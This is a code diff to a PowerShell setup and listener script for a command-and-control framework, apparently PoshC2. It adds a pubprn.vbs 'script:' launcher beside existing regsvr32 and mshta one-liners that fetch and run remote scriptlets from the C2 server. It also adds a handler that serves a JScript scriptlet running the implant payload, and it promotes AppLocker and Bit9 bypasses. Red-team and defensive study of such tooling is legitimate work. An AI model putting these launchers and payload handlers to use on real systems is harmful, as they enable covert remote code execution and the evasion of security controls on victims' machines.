@@ -835,11 +835,6 @@ else
         $ipv4address = ($localipfull,$prompt)[[bool]$prompt]
     }
 
-    if ($ipv4address.length -gt 20){
-        Write-Host "`nIP address is not valid, enter one IP address only!" -ForegroundColor Red
-        $prompt = Read-Host -Prompt "[1] Enter the IP address or Hostname of the Posh C2 server (External address if using NAT) [$($localipfull)]"
-        $ipv4address = ($localipfull,$prompt)[[bool]$prompt]
-    }
     $prompthttpsdef = "Yes"
     $prompthttps = Read-Host -Prompt "[2] Do you want to use HTTPS for implant comms? [Yes]"
     $prompthttps = ($prompthttpsdef,$prompthttps)[[bool]$prompthttps]
@@ -1063,8 +1058,9 @@ netsh http add sslcert ipport=0.0.0.0:443 certhash=REPLACE `"appid={00112233-445
     Write-Host "To quickly get setup for internal pentesting, run:"
 
     write-host $shortcut `n -ForegroundColor green
-    Write-Host "For a more stealthy approach, use SubTee's Regsvr32 or Mshta:"
+    Write-Host "For a more stealthy approach, use SubTee's exploits:"
     write-host "regsvr32 /s /n /u /i:$($ipv4address):$($serverport)/$($downloaduri)_rg scrobj.dll" -ForegroundColor green
+    write-host "cscript /b C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs printers `"script:$($ipv4address):$($serverport)/$($downloaduri)_cs`"" -ForegroundColor green
     write-host "mshta.exe vbscript:GetObject(`"script:$($ipv4address):$($serverport)/$($downloaduri)_rg`")(window.close)" -ForegroundColor green
     write-host ""
     Write-Host "To Bypass AppLocker or Bit9, use InstallUtil.exe found by SubTee:"
@@ -1240,6 +1236,30 @@ while ($listener.IsListening)
         End Sub
         Exec()
     ]]>
+</script>
+
+</scriptlet>'
+    }
+    if ($request.Url -match "/$($downloaduri)_cs$") 
+    {
+
+        $payloadparams = $payload -replace "powershell.exe ",""
+        $message = '<?XML version="1.0"?>
+<scriptlet>
+
+<registration
+    description="Bandit"
+    progid="Bandit"
+    version="1.00"
+    classid="{AAAA1111-0000-0000-0000-0000FEEDACDC}"
+    remotable="true"
+	>
+</registration>
+
+<script language="JScript">
+<![CDATA[
+    var r = new ActiveXObject("WScript.Shell").Run("'+$payload+'");	
+]]>
 </script>
 
 </scriptlet>'
